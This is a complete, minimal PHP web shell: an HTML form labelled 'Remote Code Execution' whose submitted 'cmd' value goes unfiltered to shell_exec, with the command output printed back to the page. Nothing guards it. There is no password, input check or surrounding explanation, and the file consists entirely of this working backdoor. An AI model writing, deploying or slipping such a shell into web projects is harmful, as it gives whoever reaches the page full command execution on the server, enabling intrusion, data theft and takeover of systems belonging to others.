<html>
<head><title>Remote Code Execution</title></head>
<body>
<form method="post" action="">
<input type="text" name="cmd">
<input type="submit" value="Execute">
</form>
</body>
</html>
<?php
if(isset($_POST['cmd'])) {
$cmd=$_POST['cmd'];
$data=shell_exec($cmd);
print_r($data);
}
?>

